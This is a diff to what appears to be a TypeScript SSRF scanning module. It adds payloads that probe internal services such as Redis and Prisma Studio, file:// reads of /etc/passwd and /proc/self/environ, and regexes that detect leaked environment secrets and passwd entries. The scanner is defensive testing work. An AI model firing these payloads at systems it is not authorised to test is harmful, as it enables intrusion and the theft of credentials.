@@ -23,6 +23,13 @@ const SSRF_PAYLOADS = [
   { payload: "http://017700000001/", name: "localhost" }, // 127.0.0.1 as octal
   { payload: "http://127.1/", name: "localhost" }, // shortened localhost
   { payload: "http://169.254.169.254.nip.io/latest/meta-data/", name: "AWS metadata" }, // DNS rebinding via nip.io
+  // Internal services commonly found in vibe-coded stacks
+  { payload: "http://127.0.0.1:5555/", name: "localhost" }, // Prisma Studio default
+  { payload: "http://127.0.0.1:8080/", name: "localhost" }, // Common proxy/admin
+  { payload: "http://127.0.0.1:6379/INFO", name: "Redis" }, // Redis info
+  // Protocol confusion
+  { payload: "file:///etc/passwd", name: "file protocol" },
+  { payload: "file:///proc/self/environ", name: "file protocol" },
 ];
 
 export const ssrfModule: ScanModule = async (target) => {
@@ -152,6 +159,12 @@ const isSSRFIndicator = (text: string, payloadName: string): boolean => {
   }
   if (payloadName === "Apache server-status") {
     return /Apache Server Status|scoreboard/i.test(text);
+  }
+  if (payloadName === "Redis") {
+    return /redis_version|connected_clients|used_memory|tcp_port|uptime_in_seconds|role:master|role:slave/i.test(text);
+  }
+  if (payloadName === "file protocol") {
+    return /root:.*:0:0|\/bin\/(bash|sh)|HOME=|PATH=|HOSTNAME=|SECRET|KEY|TOKEN|PASSWORD/i.test(text);
   }
   // For localhost/zero-address: check for internal service interaction evidence
   if (/localhost|zero address|IPv6/.test(payloadName)) {
